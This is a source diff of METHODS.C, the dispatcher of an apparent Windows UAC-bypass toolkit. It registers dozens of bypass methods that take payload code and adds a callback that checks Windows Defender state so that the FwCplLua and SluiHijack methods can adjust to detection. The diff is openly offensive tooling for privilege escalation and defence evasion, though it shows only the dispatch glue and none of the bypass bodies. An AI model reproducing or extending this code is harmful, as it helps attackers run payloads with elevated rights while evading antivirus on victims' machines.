@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.89
+*  VERSION:     2.90
 *
-*  DATE:        14 June 2018
+*  DATE:        10 July 2018
 *
 *  UAC bypass dispatch.
 *
@@ -17,6 +17,9 @@
 *
 *******************************************************************************/
 #include "global.h"
+
+#pragma warning(push)
+#pragma warning(disable: 4312)  //'type cast': conversion from 'BOOL' to 'PVOID' of greater size
 
 UCM_API(MethodTest);
 UCM_API(MethodSysprep);
@@ -62,6 +65,11 @@ UCM_API(MethodBitlockerRC);
 UCM_API(MethodCOMHandlers2);
 UCM_API(MethodSPPLUAObject);
 
+ULONG CALLBACK IsMethodNeedRemediation(
+    PVOID Parameter);
+
+UCM_EXTRA_CONTEXT g_ucmWDCallback = { IsMethodNeedRemediation, NULL };
+
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -105,14 +113,32 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodFwCplLua, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodFwCplLua, &g_ucmWDCallback, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodSluiHijack, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodSluiHijack, &g_ucmWDCallback, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodBitlockerRC, NULL, { 7600, 16300 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodCOMHandlers2, NULL, { 7600, MAXDWORD }, FUJINAMI_ID, FALSE, TRUE, TRUE },
     { MethodSPPLUAObject, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
+
+/*
+* IsMethodNeedRemediation
+*
+* Purpose:
+*
+* ExtraContext callback for WD filtered CmRegisterCallback sensitive methods.
+*
+*/
+ULONG CALLBACK IsMethodNeedRemediation(
+    PVOID Parameter
+)
+{
+#pragma warning(push)
+#pragma warning(disable: 4311)
+    return wdLoadAndQueryState((BOOL)Parameter, NULL); //-V205
+#pragma warning(pop)
+}
 
 /*
 * IsMethodMatchRequirements
@@ -240,7 +266,7 @@ BOOL MethodsManagerCall(
         }
     }
 
-    bResult = Entry->Routine(Method, NULL, PayloadCode, PayloadSize);
+    bResult = Entry->Routine(Method, Entry->ExtraContext, PayloadCode, PayloadSize);
 
     if (PayloadCode) {
         RtlSecureZeroMemory(PayloadCode, PayloadSize);
@@ -834,7 +860,7 @@ UCM_API(MethodSXSDccw)
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
-    return ucmSXSMethodDccw(PayloadCode, PayloadSize);
+    return ucmSXSDccwMethod(PayloadCode, PayloadSize);
 }
 
 UCM_API(MethodHakril)
@@ -847,7 +873,7 @@ UCM_API(MethodHakril)
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
-    return ucmMethodHakril(PayloadCode, PayloadSize);
+    return ucmHakrilMethod(PayloadCode, PayloadSize);
 #else
     UNREFERENCED_PARAMETER(PayloadCode);
     UNREFERENCED_PARAMETER(PayloadSize);
@@ -866,7 +892,7 @@ UCM_API(MethodCorProfiler)
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
-    return ucmMethodCorProfiler(PayloadCode, PayloadSize);
+    return ucmCorProfilerMethod(PayloadCode, PayloadSize);
 }
 
 UCM_API(MethodCOMHandlers)
@@ -906,9 +932,17 @@ UCM_API(MethodFwCplLua)
     LPWSTR lpszPayload = NULL;
 
     UNREFERENCED_PARAMETER(Method);
-    UNREFERENCED_PARAMETER(ExtraContext);
     UNREFERENCED_PARAMETER(PayloadCode);
     UNREFERENCED_PARAMETER(PayloadSize);
+
+    if (g_ctx.dwBuildNumber >= 9600) {
+        if (ExtraContext) {
+            if (ExtraContext->Routine) {
+                if (ExtraContext->Routine((PVOID)g_ctx.IsWow64) != STATUS_NO_SECRETS)
+                    g_ctx.MethodExecuteType = ucmExTypeRemediationRequired;
+            }
+        }
+    }
 
     //
     // Select target application or use given by optional parameter.
@@ -951,7 +985,7 @@ UCM_API(MethodVolatileEnv)
         return FALSE;
     }
 
-    return ucmMethodVolatileEnv(PayloadCode, PayloadSize);
+    return ucmVolatileEnvMethod(PayloadCode, PayloadSize);
 }
 
 UCM_API(MethodSluiHijack)
@@ -963,6 +997,15 @@ UCM_API(MethodSluiHijack)
     UNREFERENCED_PARAMETER(PayloadCode);
     UNREFERENCED_PARAMETER(PayloadSize);
 
+    if (g_ctx.dwBuildNumber >= 9600) {
+        if (ExtraContext) {
+            if (ExtraContext->Routine) {
+                if (ExtraContext->Routine((PVOID)g_ctx.IsWow64) != STATUS_NO_SECRETS)
+                    g_ctx.MethodExecuteType = ucmExTypeRemediationRequired;
+            }
+        }
+    }
+
     //
     // Select target application or use given by optional parameter.
     //
@@ -971,7 +1014,7 @@ UCM_API(MethodSluiHijack)
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
-    return ucmMethodSluiHijack(lpszPayload);
+    return ucmSluiHijackMethod(lpszPayload);
 }
 
 UCM_API(MethodBitlockerRC)
@@ -1019,3 +1062,5 @@ UCM_API(MethodSPPLUAObject)
 
     return ucmSPPLUAObjectMethod(PayloadCode, PayloadSize);
 }
+
+#pragma warning(pop)
